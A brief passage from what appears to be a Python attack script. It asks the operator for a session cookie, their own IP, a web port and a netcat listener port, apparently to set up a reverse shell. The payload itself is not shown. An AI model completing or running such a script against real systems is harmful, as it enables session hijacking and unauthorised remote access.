...
your_cookie=input("Enter your cookie: ")     #CHANGE ME !
your_IP=input("Enter your IP: ")                        #CHANGE ME !
your_web_port=input("Enter your webport: (default 80): ")             #CHANGE ME !
your_nc_port_listener=input("Enter your nc port listener (default 4444): ")
#CHANGE ME !
